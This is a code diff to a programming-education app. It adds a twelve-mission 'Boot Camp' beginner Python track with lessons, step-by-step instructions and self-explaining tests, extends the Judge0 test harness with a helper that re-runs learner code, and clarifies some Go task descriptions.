@@ -71,7 +71,10 @@ let CURRICULUM_SCRIPTS: [String] = [
       }));
     });
   };
-  RA.brief = (m, faction) => (m.brief && m.brief[faction]) || RA.BRIEFS[m.rank - 1][faction].replace(/\{L\}/g, RA.langs[m.lang].name);
+  RA.brief = (m, faction) => (m.brief && m.brief[faction]) || RA.BRIEFS[m.rank - 1][faction].replace(/\{L\}/g, RA.langs[m.lang].briefName || RA.langs[m.lang].name);
+  // Boot Camp first, then the twelve languages. Tracks (Boot Camp) aren't counted as languages.
+  RA.LANG_ORDER = ["basics", "python", "javascript", "typescript", "sql", "bash", "go", "rust", "swift", "kotlin", "java", "csharp", "cpp"];
+  RA.isTrack = (L) => !!(RA.langs[L] && RA.langs[L].track);
 
   // Shared SQL training database.
   RA.SQL_SETUP = `
@@ -418,6 +421,7 @@ RA.PET_PARTS = {
 
   // Judge0 targets. ce = https://ce.judge0.com, extra = https://extra-ce.judge0.com
   RA.ENGINES = {
+    basics:     { host: "ce", id: 109, label: "Python 3.13 (Judge0)" },
     python:     { host: "ce", id: 109, label: "Python 3.13 (Judge0)" },
     javascript: { host: "ce", id: 102, label: "Node.js 22 (Judge0)" },
     typescript: { host: "ce", id: 101, label: "tsc + Node (Judge0)", opts: "--target esnext --lib esnext,dom" },
@@ -432,7 +436,7 @@ RA.PET_PARTS = {
     cpp:        { host: "ce", id: 105, label: "GCC 14 C++23 (Judge0)", opts: "-std=c++23 -pthread -O1" }
   };
   RA.CI_TOOLCHAINS = {
-    python: "Python 3.13", javascript: "Node.js 22", typescript: "TypeScript 5.6 --strict", sql: "SQLite 3 (Python)",
+    basics: "Python 3.13", python: "Python 3.13", javascript: "Node.js 22", typescript: "TypeScript 5.6 --strict", sql: "SQLite 3 (Python)",
     bash: "Bash 5 + jq on Ubuntu 24.04", go: "Go (stable)", rust: "Rust (stable)", swift: "Swift 6 on macOS (Xcode)",
     kotlin: "Kotlin 2.x + kotlinx.coroutines", java: "JDK 25 + JUnit 5", csharp: ".NET 10 (dotnet run app.cs)", cpp: "g++ 14 -std=c++23"
   };
@@ -618,7 +622,7 @@ ra_eq() { if [ "$2" = "$3" ]; then echo "::cp::PASS::$1"; else echo "::cp::FAIL:
   RA.compose = (m, user, env) => {
     env = env || "judge0";
     const L = m.lang;
-    if (L === "python") return RA.genPython(m, user);
+    if (L === "python" || L === "basics") return RA.genPython(m, user);
     if (L === "javascript") return RA.genJs(m, user, false);
     if (L === "typescript") return RA.genJs(m, user, true);
     if (L === "sql") return RA.genSql(m, user);
@@ -694,9 +698,21 @@ def __ra_cp(ok, label, detail=""):
     print(f"::cp::{'PASS' if ok else 'FAIL'}::{label}::{d}", flush=True)
 def check(got, want, label="check"):
     __ra_cp(got == want, label, "" if got == want else f"got {got!r}, want {want!r}")
+__ra_src = ${JSON.stringify(user)}
+def output_of(**subs):
+    """Run the learner's program again in a clean namespace and return what it printed.
+    Keyword arguments replace a top-level assignment first, e.g. output_of(clearance=1)."""
+    import io, re, contextlib
+    s = __ra_src
+    for k, v in subs.items():
+        s = re.sub(r"^(" + k + r"\\s*=).*$", lambda mm: mm.group(1) + " " + repr(v), s, count=1, flags=re.M)
+    buf = io.StringIO()
+    with contextlib.redirect_stdout(buf):
+        exec(compile(s, "mission.py", "exec"), {"__name__": "__main__"})
+    return buf.getvalue()
 __ra_user_ok = True
 try:
-    exec(compile(${JSON.stringify(user)}, "mission.py", "exec"), globals())
+    exec(compile(__ra_src, "mission.py", "exec"), globals())
 except BaseException as __e:
     __ra_user_ok = False
     __ra_cp(False, "Your code runs", f"{type(__e).__name__}: {__e}")
@@ -785,7 +801,7 @@ if ran:
   RA.judge0Request = (m, user, cfg) => {
     cfg = cfg || {};
     const eng = RA.ENGINES[m.lang];
-    const harness = m.lang in { python: 1, javascript: 1, typescript: 1, sql: 1 } ? "gen" : RA.HARNESS[m.id];
+    const harness = m.lang in { basics: 1, python: 1, javascript: 1, typescript: 1, sql: 1 } ? "gen" : RA.HARNESS[m.id];
     const meta = RA.harnessMeta(harness === "gen" ? "" : harness);
     if (meta.ciOnly) return { engine: eng.label, ciOnly: meta.ciOnly };
     const src = RA.compose(m, user, "judge0");
@@ -817,7 +833,7 @@ if ran:
     const results = RA.parseCheckpoints(stdout);
     RA.testSuiteSummary(stdout, results, run.user || "");
     if (status === "Compilation Error") results.unshift({ status: "FAIL", label: "Compiles", detail: compile.split("\n").filter((l) => /error/i.test(l)).slice(0, 4).join(" / ") || compile.slice(0, 400) });
-    else if (["python", "javascript", "sql", "bash"].indexOf(m.lang) < 0) results.unshift({ status: "PASS", label: "Compiles", detail: "" });
+    else if (["basics", "python", "javascript", "sql", "bash"].indexOf(m.lang) < 0) results.unshift({ status: "PASS", label: "Compiles", detail: "" });
     if (status !== "Accepted" && status !== "Compilation Error") results.push({ status: "FAIL", label: "Runs to completion", detail: status + (stderr ? ": " + stderr.slice(0, 300) : "") });
     (meta.checkpoints || []).forEach((label) => { if (!results.some((x) => x.label === label)) results.push({ status: "FAIL", label, detail: "not reached" }); });
     return { status, stdout, stderr, compile, results };
@@ -838,6 +854,237 @@ if ran:
   };
   RA.allPassed = (rep) => rep && rep.results.length > 0 && rep.results.every((x) => x.status !== "FAIL");
 })(typeof window !== "undefined" ? window : globalThis);
+
+"""##,
+    // web/curriculum/basics.js
+    ##"""
+// Boot Camp: the zero-experience on-ramp. Twelve tiny Python missions that teach what code *is*
+// before any language track. Every mission has numbered steps, a test that explains itself, and a
+// reference solution in curriculum/solutions/bcN.py. Checkpoints run on Python 3.13 like the Python track.
+RA.lang("basics", {
+  name: "Boot Camp", tag: "BC", runtime: "py", base: "python", briefName: "Python", track: true,
+  why: "Start here if you have never written code. Twelve short missions in Python, the friendliest first language, that teach how programs work. Each one builds on the last."
+});
+RA.add("basics", "bc", [
+{ title: "Hello, Operator", module: "Your First Program", concept: "what a program is, print, text in quotes",
+  lesson: `<p>A <b>program</b> is a list of instructions the computer follows from top to bottom, one line at a time. You type the instructions in the editor, and the computer runs them.</p>
+<p>The first instruction most people learn is <code>print</code>. It shows text on the screen:</p><pre>print("Wake up")</pre>
+<p>Three things matter here:</p><ul><li><code>print</code> is the name of the instruction, and it is all lowercase.</li><li>The round brackets <code>( )</code> hold what you want printed.</li><li>Text goes inside quote marks <code>" "</code>. Code calls a piece of text a <b>string</b>. The quotes tell Python "this is text, not an instruction".</li></ul>
+<p>Lines that start with <code>#</code> are <b>comments</b>. They are notes for humans, and Python skips them.</p>`,
+  task: `Write one line of code that prints exactly <code>Hello, Operator</code>, with a capital H, a comma, a space and a capital O.`,
+  starter: `# Lines starting with # are comments. Python ignores them.\n# Type your print instruction on the line below.\n\n`,
+  checks: [[/print\s*\(/, "Use print( ) to show text."], [/["']Hello, Operator["']/, "Put the exact text Hello, Operator inside quote marks."]],
+  steps: [
+    "Click on the empty line under the comments in the editor.",
+    "Type <code>print</code> in lowercase letters.",
+    "Right after it, with no space, type an opening bracket <code>(</code>.",
+    "Type a quote mark <code>\"</code>, then <code>Hello, Operator</code>, then another quote mark <code>\"</code>.",
+    "Close the bracket with <code>)</code>. Your line should read <code>print(\"Hello, Operator\")</code>.",
+    "Press <b>Run external checkpoints</b>. Your code is sent to a real Python 3.13 computer, which runs it and reports back."
+  ],
+  test: { py: `out = output_of()\ncheck(out.strip(), "Hello, Operator", "prints Hello, Operator")\ncheck(out.count("\\n"), 1, "prints exactly one line")` } },
+
+{ title: "Call Sign", module: "Variables", concept: "variables, = assignment, strings vs numbers",
+  lesson: `<p>A <b>variable</b> is a name that holds a value, like a labelled box. You create one with <code>=</code>:</p><pre>codename = "trinity"
+missions = 7</pre>
+<p>Read <code>=</code> as "store this value in this name", not "equals". The name goes on the left and the value on the right.</p>
+<p>Values come in different <b>types</b>. <code>"trinity"</code> is a <b>string</b> (text, always in quotes). <code>7</code> is an <b>integer</b> (a whole number, never in quotes). <code>"7"</code> with quotes is text that happens to look like a number, and Python treats it differently.</p>
+<p>To use a variable, write its name without quotes. <code>print(codename)</code> prints <code>trinity</code>, but <code>print("codename")</code> prints the word <code>codename</code>.</p>
+<p>Variable names use lowercase letters, numbers and underscores (<code>call_sign</code>), and can't start with a number or contain spaces.</p>`,
+  task: `Create a variable <code>handle</code> holding the text <code>"neo"</code> and a variable <code>level</code> holding the number <code>1</code> (no quotes). Then print <code>handle</code>.`,
+  starter: `# Create your two variables here\n\n\n# Then print handle\n`,
+  checks: [[/^\s*handle\s*=/m, "Create the variable with handle = ..."], [/^\s*level\s*=\s*1\b/m, "Store the number 1 in level, with no quotes."], [/print\s*\(\s*handle\s*\)/, "Print the variable: print(handle), with no quotes around handle."]],
+  steps: [
+    "On the first empty line, type <code>handle = \"neo\"</code>. That stores the text neo in a box called handle.",
+    "On the next line, type <code>level = 1</code>. There are no quotes, because 1 is a number.",
+    "On the line under <code># Then print handle</code>, type <code>print(handle)</code>. There are no quotes around <code>handle</code>, because you want the value inside the box, not the word handle.",
+    "Run the checkpoints. You should see <code>neo</code> printed."
+  ],
+  test: { py: `check(handle, "neo", "handle holds \\"neo\\"")\ncheck(level, 1, "level holds the number 1")\ncheck(type(level).__name__, "int", "level is a number, not text")\ncheck(output_of().strip(), "neo", "prints the value of handle")` } },
+
+{ title: "Node Count", module: "Math", concept: "arithmetic, + - * /, using variables in calculations",
+  lesson: `<p>Python does maths with the usual symbols: <code>+</code> add, <code>-</code> subtract, <code>*</code> multiply and <code>/</code> divide.</p><pre>hours = 3
+minutes = hours * 60     # 180
+print(minutes)</pre>
+<p>The right side of <code>=</code> is worked out first, and then the answer is stored. Because <code>minutes</code> is calculated from <code>hours</code>, changing <code>hours</code> changes the answer automatically. Programs do this all the time: they work answers out from data instead of having them typed in.</p>
+<p><code>/</code> always gives a decimal (<code>7 / 2</code> is <code>3.5</code>). <code>//</code> gives a whole number (<code>7 // 2</code> is <code>3</code>).</p>`,
+  task: `Create <code>nodes = 12</code> and <code>offline = 5</code>. Create <code>online</code> by calculating <code>nodes - offline</code> (don't type 7), then print <code>online</code>.`,
+  starter: `nodes = 12\noffline = 5\n\n# Calculate online from the two variables above\n\n# Print it\n`,
+  checks: [[/^\s*online\s*=\s*nodes\s*-\s*offline\b/m, "Calculate it: online = nodes - offline"], [/print\s*\(\s*online\s*\)/, "Print the result with print(online)"]],
+  steps: [
+    "Leave the first two lines as they are. They already create <code>nodes</code> and <code>offline</code>.",
+    "Under the calculate comment, type <code>online = nodes - offline</code>. Python works out 12 minus 5 and stores 7 in <code>online</code>.",
+    "Under the print comment, type <code>print(online)</code>.",
+    "Run the checkpoints. They also change <code>nodes</code> and <code>offline</code> to other numbers to make sure you calculated the answer instead of typing 7."
+  ],
+  test: { py: `check(online, 7, "online is 7")\ncheck(output_of().strip(), "7", "prints 7")\ncheck(output_of(nodes=20, offline=4).strip(), "16", "still right when nodes=20, offline=4 (so it's calculated)")` } },
+
+{ title: "Message Builder", module: "Text", concept: "joining strings with +, f-strings",
+  lesson: `<p>You can join strings together with <code>+</code>:</p><pre>first = "Agent "
+name = "smith"
+print(first + name)        # Agent smith</pre>
+<p>Spaces aren't added for you. <code>"Agent" + "smith"</code> gives <code>Agentsmith</code>, so put the space inside the quotes.</p>
+<p>An easier way is an <b>f-string</b>. Put the letter <code>f</code> right before the opening quote, then write variable names inside curly braces <code>{ }</code>, and Python swaps in their values:</p><pre>print(f"Agent {name} reporting")   # Agent smith reporting</pre>`,
+  task: `<code>name = "neo"</code> is given. Create <code>message</code> using <code>+</code> so it holds <code>"Agent neo"</code>. Create <code>badge</code> using an f-string so it holds <code>"[neo] online"</code>. Print <code>message</code>, then print <code>badge</code>.`,
+  starter: `name = "neo"\n\n# message: join "Agent " and name with +\n\n# badge: use an f-string\n\n# print message, then badge\n`,
+  checks: [[/^\s*message\s*=.*\+\s*name/m, "Build message with + and the name variable: \"Agent \" + name"], [/^\s*badge\s*=\s*f["']/m, "Start badge with f\" so it's an f-string"], [/\{\s*name\s*\}/, "Put {name} inside the f-string"], [/print\s*\(\s*message\s*\)[\s\S]*print\s*\(\s*badge\s*\)/, "Print message first, then badge"]],
+  steps: [
+    "Under the message comment, type <code>message = \"Agent \" + name</code>. Note the space after <code>Agent</code> inside the quotes.",
+    "Under the badge comment, type <code>badge = f\"[{name}] online\"</code>. The <code>f</code> goes right before the quote with no space.",
+    "Under the print comment, type <code>print(message)</code> on one line and <code>print(badge)</code> on the next.",
+    "Run the checkpoints. They try another name too, so make sure you used <code>name</code> and didn't type <code>neo</code> into the message yourself."
+  ],
+  test: { py: `check(message, "Agent neo", "message is \\"Agent neo\\"")\ncheck(badge, "[neo] online", "badge is \\"[neo] online\\"")\ncheck(output_of(name="trinity").split("\\n")[:2], ["Agent trinity", "[trinity] online"], "works for name=\\"trinity\\" too")` } },
+
+{ title: "Clearance Check", module: "Decisions", concept: "if / else, comparisons, indentation",
+  lesson: `<p>Programs make decisions with <code>if</code>. If the <b>condition</b> is true, the indented lines underneath run. Otherwise, the lines under <code>else</code> run:</p><pre>battery = 15
+if battery &lt; 20:
+    print("charge now")
+else:
+    print("ok")</pre>
+<p>The rules:</p><ul><li>The <code>if</code> line and the <code>else</code> line both end with a colon <code>:</code>.</li><li>The lines that belong to them are <b>indented</b> by 4 spaces (press Tab or type 4 spaces). Indentation is how Python knows which lines are inside the <code>if</code>.</li></ul>
+<p>Comparisons: <code>&gt;</code> greater than, <code>&lt;</code> less than, <code>&gt;=</code> at least, <code>&lt;=</code> at most, <code>==</code> equal to (two equals signs, because one <code>=</code> stores a value), and <code>!=</code> not equal.</p>`,
+  task: `<code>clearance = 4</code> is given. If <code>clearance</code> is 3 or more, print <code>ACCESS GRANTED</code>. Otherwise print <code>ACCESS DENIED</code>.`,
+  starter: `clearance = 4\n\n# Write your if / else below\n`,
+  checks: [[/^\s*if\s+clearance\s*>=\s*3\s*:/m, "Start with: if clearance >= 3:  (with the colon at the end)"], [/^\s*else\s*:/m, "Add else: on its own line, with a colon"], [/^\s{2,}print\s*\(/m, "Indent the print lines by 4 spaces under if and else"]],
+  steps: [
+    "Under the comment, type <code>if clearance &gt;= 3:</code>. Don't forget the colon at the end.",
+    "Press Enter, then indent with 4 spaces and type <code>print(\"ACCESS GRANTED\")</code>.",
+    "On the next line, go back to the left edge (no spaces) and type <code>else:</code>.",
+    "Press Enter, indent with 4 spaces again and type <code>print(\"ACCESS DENIED\")</code>.",
+    "Run the checkpoints. They rerun your code with clearance set to 4, 3 and 1, so both branches get tested."
+  ],
+  test: { py: `check(output_of(clearance=4).strip(), "ACCESS GRANTED", "clearance 4 is granted")\ncheck(output_of(clearance=3).strip(), "ACCESS GRANTED", "clearance 3 is granted (3 or more)")\ncheck(output_of(clearance=1).strip(), "ACCESS DENIED", "clearance 1 is denied")` } },
+
+{ title: "Countdown Loop", module: "Loops", concept: "for loops, range, repeating code",
+  lesson: `<p>A <b>loop</b> repeats code so you don't have to copy it out. A <code>for</code> loop runs its indented lines once for every item:</p><pre>for n in range(1, 4):
+    print("ping", n)</pre><p>That prints <code>ping 1</code>, <code>ping 2</code> and <code>ping 3</code>. Each time round, <code>n</code> holds the next number.</p>
+<p><code>range(start, stop)</code> counts from <code>start</code> up to <b>but not including</b> <code>stop</code>. So <code>range(1, 4)</code> gives 1, 2 and 3. This trips up almost everyone at first.</p>
+<p>Like <code>if</code>, the <code>for</code> line ends with a colon, and the repeated lines are indented.</p>`,
+  task: `Use a <code>for</code> loop with <code>range</code> to print the numbers 1, 2, 3, 4 and 5, one per line.`,
+  starter: `# Use a for loop with range to print 1 to 5\n`,
+  checks: [[/^\s*for\s+\w+\s+in\s+range\s*\(/m, "Use for ... in range(...):"], [/range\s*\(\s*1\s*,\s*6\s*\)/, "range(1, 6) gives 1 to 5, because the stop number isn't included"], [/^\s{2,}print\s*\(/m, "Indent the print under the for line"]],
+  steps: [
+    "Type <code>for n in range(1, 6):</code>. Use 6 rather than 5 because range stops just before the second number.",
+    "Press Enter, indent 4 spaces and type <code>print(n)</code>.",
+    "That's the whole program. Two lines print five numbers.",
+    "Run the checkpoints. If you see 1 to 4, raise the stop number by one."
+  ],
+  test: { py: `check(output_of().split(), ["1", "2", "3", "4", "5"], "prints 1 to 5")` } },
+
+{ title: "Crew Manifest", module: "Lists", concept: "lists, len, indexing from 0, append, looping over a list",
+  lesson: `<p>A <b>list</b> holds many values in order, inside square brackets:</p><pre>relays = ["north", "harbor", "hill"]</pre>
+<ul><li><code>len(relays)</code> gives how many items there are (3).</li><li><code>relays[0]</code> is the <b>first</b> item, <code>"north"</code>. Positions start at 0, not 1, so <code>relays[2]</code> is the third.</li><li><code>relays.append("tower")</code> adds an item to the end.</li><li><code>for r in relays:</code> loops over every item in order.</li></ul>`,
+  task: `Create <code>agents = ["neo", "trinity", "morpheus"]</code>. Print how many agents there are with <code>len</code>, then print the first agent. Append <code>"tank"</code>, then loop over <code>agents</code> and print each name.`,
+  starter: `# 1. Create the agents list\n\n# 2. Print how many there are\n\n# 3. Print the first agent\n\n# 4. Append "tank"\n\n# 5. Loop and print each name\n`,
+  checks: [[/^\s*agents\s*=\s*\[/m, "Create the list with agents = [ ... ]"], [/len\s*\(\s*agents\s*\)/, "Use len(agents) to count"], [/agents\s*\[\s*0\s*\]/, "The first item is agents[0]"], [/agents\.append\s*\(/, "Use agents.append(\"tank\")"], [/^\s*for\s+\w+\s+in\s+agents\s*:/m, "Loop with for name in agents:"]],
+  steps: [
+    "Under comment 1, type <code>agents = [\"neo\", \"trinity\", \"morpheus\"]</code>.",
+    "Under comment 2, type <code>print(len(agents))</code>. It prints 3.",
+    "Under comment 3, type <code>print(agents[0])</code>. Position 0 is the first item, so it prints neo.",
+    "Under comment 4, type <code>agents.append(\"tank\")</code>.",
+    "Under comment 5, type <code>for name in agents:</code>, then on the next line, indented, <code>print(name)</code>.",
+    "Run the checkpoints. The output should be 3, neo, then all four names."
+  ],
+  test: { py: `check(agents, ["neo", "trinity", "morpheus", "tank"], "agents ends with tank appended")\ncheck(output_of().split(), ["3", "neo", "neo", "trinity", "morpheus", "tank"], "prints the count, the first agent, then every name")` } },
+
+{ title: "Greeting Protocol", module: "Functions", concept: "def, parameters, return vs print",
+  lesson: `<p>A <b>function</b> is a named, reusable block of code. You define it once with <code>def</code> and can use it (<b>call</b> it) as often as you like:</p><pre>def shout(word):
+    return word.upper() + "!"
+
+print(shout("run"))     # RUN!
+print(shout("now"))     # NOW!</pre>
+<ul><li><code>word</code> is a <b>parameter</b>, a variable that receives whatever you pass in the brackets.</li><li><code>return</code> sends a value back to whoever called the function. The function stops there.</li></ul>
+<p><b>return and print are not the same.</b> <code>print</code> only shows text on screen. <code>return</code> hands the value back so other code can use it. A function with no <code>return</code> gives back <code>None</code>, which means "nothing".</p>`,
+  task: `Write a function <code>greet(name)</code> that <b>returns</b> (not prints) <code>"Welcome, "</code> followed by the name. <code>greet("neo")</code> returns <code>"Welcome, neo"</code>.`,
+  starter: `def greet(name):\n    # Replace the next line with a return\n    pass\n\nprint(greet("neo"))\n`,
+  checks: [[/def\s+greet\s*\(\s*name\s*\)\s*:/, "Keep def greet(name):"], [/^\s+return\s+/m, "Use return inside the function (indented)"], [/["']Welcome, ["']/, "Include the text \"Welcome, \" with the comma and space"]],
+  steps: [
+    "Leave <code>def greet(name):</code> as it is. It says the function is called greet and takes one input called name.",
+    "Delete the line <code>pass</code>. It means \"do nothing\", and that's why the starter returns None.",
+    "In its place, indented 4 spaces, type <code>return \"Welcome, \" + name</code>.",
+    "Leave the last line alone. <code>print(greet(\"neo\"))</code> calls your function and prints what it returns.",
+    "Run the checkpoints. They call <code>greet</code> with different names and check the returned value."
+  ],
+  test: { py: `check(greet("neo"), "Welcome, neo", "greet(\\"neo\\")")\ncheck(greet("trinity"), "Welcome, trinity", "greet(\\"trinity\\")")` } },
+
+{ title: "Gatekeeper", module: "Functions + Decisions", concept: "if/else inside a function, returning different values",
+  lesson: `<p>Functions get useful when they make decisions. You can put an <code>if</code> inside a function and <code>return</code> different answers:</p><pre>def size(n):
+    if n &gt; 100:
+        return "big"
+    else:
+        return "small"</pre>
+<p>Look at the indentation. The <code>if</code> is indented once because it is inside the function, and the <code>return</code> lines are indented twice because they are inside the <code>if</code>.</p>
+<p>As soon as a <code>return</code> runs, the function ends, so only one answer ever comes back.</p>`,
+  task: `Write <code>access(clearance)</code> that returns <code>"GRANTED"</code> when clearance is 3 or more, and <code>"DENIED"</code> otherwise.`,
+  starter: `def access(clearance):\n    # your if / else with two returns\n    pass\n`,
+  checks: [[/def\s+access\s*\(\s*clearance\s*\)\s*:/, "Keep def access(clearance):"], [/\bif\s+clearance\s*>=\s*3\s*:/, "Use if clearance >= 3:"], [/return\s+["']GRANTED["']/, "Return \"GRANTED\""], [/return\s+["']DENIED["']/, "Return \"DENIED\""]],
+  steps: [
+    "Delete <code>pass</code>.",
+    "Indented once (4 spaces), type <code>if clearance &gt;= 3:</code>.",
+    "Indented twice (8 spaces), type <code>return \"GRANTED\"</code>.",
+    "Indented once, type <code>else:</code>, and on the next line, indented twice, type <code>return \"DENIED\"</code>.",
+    "Run the checkpoints. They try 5, 3, 2 and 0."
+  ],
+  test: { py: `for c, w in [(5, "GRANTED"), (3, "GRANTED"), (2, "DENIED"), (0, "DENIED")]:\n    check(access(c), w, f"access({c})")` } },
+
+{ title: "Running Total", module: "Functions + Loops", concept: "accumulator pattern, += , loops inside functions",
+  lesson: `<p>A very common pattern is the <b>accumulator</b>. You start a variable at zero, add to it inside a loop, then use the result:</p><pre>def count_long(words):
+    count = 0
+    for w in words:
+        if len(w) &gt; 5:
+            count += 1
+    return count</pre>
+<p><code>count += 1</code> is short for <code>count = count + 1</code>, meaning "add one to count".</p>
+<p>The <code>return</code> is <b>not</b> indented under the <code>for</code>. It runs once, after the loop has finished. If you indent it inside the loop, the function returns after the first item, which is a classic beginner bug.</p>`,
+  task: `Write <code>total(numbers)</code> that adds up every number in the list using a <code>for</code> loop (don't use <code>sum()</code> yet) and returns the result. <code>total([1, 2, 3])</code> returns <code>6</code>, and <code>total([])</code> returns <code>0</code>.`,
+  starter: `def total(numbers):\n    # start at 0, add each number, return the result\n    pass\n`,
+  checks: [[/def\s+total\s*\(\s*numbers\s*\)\s*:/, "Keep def total(numbers):"], [/^\s+\w+\s*=\s*0\s*$/m, "Start an accumulator at 0, for example result = 0"], [/^\s+for\s+\w+\s+in\s+numbers\s*:/m, "Loop with for n in numbers:"], [/\+=|=\s*\w+\s*\+\s*\w+/, "Add each number with result += n"]],
+  steps: [
+    "Delete <code>pass</code>.",
+    "Indented once, type <code>result = 0</code>. This is your running total.",
+    "Indented once, type <code>for n in numbers:</code>.",
+    "Indented twice, type <code>result += n</code>, which adds the current number.",
+    "Indented once (back in line with <code>for</code>, not inside it), type <code>return result</code>.",
+    "Run the checkpoints. They include an empty list, which should return 0."
+  ],
+  test: { py: `check(total([1, 2, 3]), 6, "total([1, 2, 3])")\ncheck(total([]), 0, "total([]) is 0")\ncheck(total([10, -4]), 6, "total([10, -4])")\ncheck(total([5]), 5, "a single number")` } },
+
+{ title: "Read the Error", module: "Reading Errors", concept: "SyntaxError, NameError, debugging with error messages",
+  lesson: `<p>Every programmer sees errors constantly. An error message isn't a failure. It's the computer telling you exactly what confused it and where. Learning to read errors is one of the most important skills you'll build.</p>
+<p>Two very common kinds:</p><ul><li><b>SyntaxError</b>: the code isn't written in a shape Python understands, such as a missing colon, bracket or quote. Python won't run any of the program. Look at the line it names and the line just above it.</li><li><b>NameError</b>: you used a name Python has never seen, usually a typo (<code>cout</code> instead of <code>count</code>) or a variable used before it was created.</li></ul>
+<p>Some bugs give no error at all. The code runs, but the answer is wrong. When that happens, compare what you got with what you wanted and trace the code line by line.</p>`,
+  task: `The starter code has two bugs. <code>count_fails(statuses)</code> should return how many items in the list equal <code>"FAIL"</code>. Run it first and read the error, then fix both bugs.`,
+  starter: `def count_fails(statuses)\n    count = 0\n    for s in statuses:\n        if s == "FAIL":\n            cout = count + 1\n    return count\n`,
+  checks: [[/def\s+count_fails\s*\(\s*statuses\s*\)\s*:/, "Bug 1: the def line needs a colon at the end"], [/^\s+count\s*(\+=\s*1|=\s*count\s*\+\s*1)/m, "Bug 2: the line inside the if should add 1 to count. Check the spelling."]],
+  steps: [
+    "Press <b>Run external checkpoints</b> before changing anything. You'll see <code>SyntaxError: expected ':'</code>. Python is pointing at the first line.",
+    "Add the missing colon to the end of the first line: <code>def count_fails(statuses):</code>.",
+    "Run again. There's no error this time, but the answer is wrong (0 instead of 2), because the code inside the <code>if</code> stores into <code>cout</code>, a misspelled new variable.",
+    "Change <code>cout = count + 1</code> to <code>count = count + 1</code>, or the shorter <code>count += 1</code>.",
+    "Run the checkpoints. Both bugs are fixed when they all pass."
+  ],
+  test: { py: `check(count_fails(["OK", "FAIL", "FAIL"]), 2, "counts two FAILs")\ncheck(count_fails([]), 0, "empty list is 0")\ncheck(count_fails(["OK"]), 0, "no FAILs is 0")` } },
+
+{ title: "Field Report", module: "Capstone", concept: "functions, loops, conditions, strings together",
+  lesson: `<p>Your first capstone puts everything together: a function, a loop, a condition and an f-string.</p>
+<p>Plan before you type. Write the steps in plain words first. Programmers call this <b>pseudocode</b>:</p><pre># if the list is empty: give back "no data"
+# count how many items are "FAIL"
+# give back "&lt;fails&gt; of &lt;total&gt; failed"</pre>
+<p>Then turn each line into code. Checking for the empty case first is called a <b>guard</b>. It deals with the odd case up front so the rest of the code stays simple.</p>
+<p>After this, you're ready for any language track. Python rank 1 is the natural next step.</p>`,
+  task: `Write <code>report(statuses)</code>. If the list is empty, return <code>"no data"</code>. Otherwise count the <code>"FAIL"</code> items and return <code>"&lt;fails&gt; of &lt;total&gt; failed"</code>. <code>report(["OK", "FAIL", "FAIL", "OK"])</code> returns <code>"2 of 4 failed"</code>.`,
+  starter: `def report(statuses):\n    # 1. if the list is empty, return "no data"\n    # 2. count the FAILs\n    # 3. return the sentence with an f-string\n    pass\n`,
+  checks: [[/def\s+report\s*\(\s*statuses\s*\)\s*:/, "Keep def report(statuses):"], [/len\s*\(\s*statuses\s*\)\s*==\s*0|not\s+statuses/, "Check for an empty list: if len(statuses) == 0:"], [/^\s+for\s+\w+\s+in\s+statuses\s*:/m, "Loop over statuses to count the FAILs"], [/return\s+f["']/, "Return the sentence with an f-string"]],
+  steps: [
+    "Delete <code>pass</code>. Keep the comments as your plan.",
+    "Step 1: indented once, type <code>if len(statuses) == 0:</code>, and on the next line, indented twice, <code>return \"no data\"</code>.",
+    "Step 2: indented once, <code>fails = 0</code>, then <code>for s in statuses:</code>, then indented twice <code>if s == \"FAIL\":</code>, then indented three times <code>fails += 1</code>.",
+    "Step 3: indented once (outside the loop), <code>return f\"{fails} of {len(statuses)} failed\"</code>.",
+    "Run the checkpoints. They try an empty list, a list with no FAILs and a mixed list."
+  ],
+  test: { py: `check(report(["OK", "FAIL", "FAIL", "OK"]), "2 of 4 failed", "mixed list")\ncheck(report([]), "no data", "empty list")\ncheck(report(["OK"]), "0 of 1 failed", "no fails")\ncheck(report(["FAIL"] * 3), "3 of 3 failed", "all fails")` } }
+]);
 
 """##,
     // web/curriculum/python.js
@@ -1636,7 +1883,7 @@ func counter() func() int {
     return func() int { n++; return n }
 }
 defer f.Close()   // runs when the function returns</pre>`,
-  task: `Write <code>func makeCounter(start int) func() int</code> (a closure), and <code>func minMax(nums ...int) (min, max int)</code> with named results.`,
+  task: `Write <code>func makeCounter(start int) func() int</code> (a closure), and <code>func minMax(nums ...int) (min, max int)</code> with named results. <code>makeCounter(10)</code> returns a function whose calls count up by 1 from 10. <code>minMax(4, -2, 9, 3)</code> returns <code>-2, 9</code>.`,
   starter: `package main\n\n// your code here\n`,
   checks: [[/func\s+makeCounter\s*\(\s*start\s+int\s*\)\s+func\s*\(\s*\)\s+int/, "func makeCounter(start int) func() int"], [/return\s+func\s*\(\s*\)\s+int/, "return func() int { ... }"], [/func\s+minMax\s*\(\s*nums\s+\.\.\.int\s*\)\s*\(\s*min\s*,\s*max\s+int\s*\)/, "func minMax(nums ...int) (min, max int)"]] },
 
@@ -1718,7 +1965,7 @@ for _, h := range hosts {
     }(h)
 }
 wg.Wait()</pre><p>Shared memory needs a lock. Run <code>go test -race</code> to catch data races.</p>`,
-  task: `Write <code>func sweep(hosts []string) int</code> that pings every host in its own goroutine, counts the ones where <code>ping(h)</code> returns true using a <code>sync.Mutex</code>, and waits with a <code>sync.WaitGroup</code>.`,
+  task: `Write <code>func sweep(hosts []string) int</code> that pings every host in its own goroutine, counts the ones where <code>ping(h)</code> returns true using a <code>sync.Mutex</code>, and waits with a <code>sync.WaitGroup</code>. A host counts as reachable when its name isn't empty, so <code>sweep([]string{"a", "", "c"})</code> returns 2.`,
   starter: `package main\n\nimport "sync"\n\nfunc ping(h string) bool { return len(h) > 0 }\n\n// your code here\n`,
   checks: [[/sync\.WaitGroup/, "var wg sync.WaitGroup"], [/sync\.Mutex/, "var mu sync.Mutex"], [/go\s+func/, "go func(h string) { ... }(h)"], [/defer\s+wg\.Done\(\)/, "defer wg.Done()"], [/mu\.Lock\(\)/, "mu.Lock()"], [/mu\.Unlock\(\)/, "mu.Unlock()"], [/wg\.Wait\(\)/, "wg.Wait()"]] },
 
@@ -1888,7 +2135,7 @@ for h in hosts {
 for h in handles { h.join().unwrap(); }
 
 let (tx, rx) = mpsc::channel();</pre><p>The compiler won't let you share non-thread-safe data. For async I/O, the ecosystem uses <code>tokio</code>.</p>`,
-  task: `Write <code>fn sweep(hosts: Vec&lt;String&gt;) -&gt; usize</code> that spawns a thread per host with <code>thread::spawn(move || ...)</code>, increments a shared <code>Arc&lt;Mutex&lt;usize&gt;&gt;</code>, joins every handle and returns the final count.`,
